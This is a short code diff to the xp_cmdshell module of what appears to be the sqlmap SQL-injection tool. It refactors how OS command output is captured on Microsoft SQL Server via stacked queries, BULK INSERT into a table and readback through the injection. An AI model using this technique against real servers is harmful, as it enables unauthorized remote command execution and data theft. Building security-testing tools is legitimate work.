@@ -134,20 +134,20 @@ class xp_cmdshell:
         inject.goStacked(cmd, silent)
 
 
-    def xpCmdshellEvalCmd(self, cmd):
+    def xpCmdshellEvalCmd(self, cmd, first=None, last=None):
         self.getRemoteTempPath()
 
         tmpFile = "%s/sqlmapevalcmd%s.txt" % (conf.tmpPath, randomStr(lowercase=True))
         cmd     = self.xpCmdshellForgeCmd("%s > %s" % (cmd, tmpFile))
 
         self.xpCmdshellExecCmd(cmd)
-        self.xpCmdshellExecCmd("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, tmpFile, randomStr(10), randomStr(10)))
 
-        cmd = self.xpCmdshellForgeCmd("del /F %s" % tmpFile.replace("/", "\\"))
-        self.xpCmdshellExecCmd(cmd)
+        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, tmpFile, randomStr(10), randomStr(10)))
 
-        output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, sort=False)
-        self.xpCmdshellExecCmd("DELETE FROM %s" % self.cmdTblName)
+        self.delRemoteTempFile(tmpFile)
+
+        output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, sort=False, firstChar=first, lastChar=last)
+        inject.goStacked("DELETE FROM %s" % self.cmdTblName)
 
         if isinstance(output, (list, tuple)):
             output = output[0]
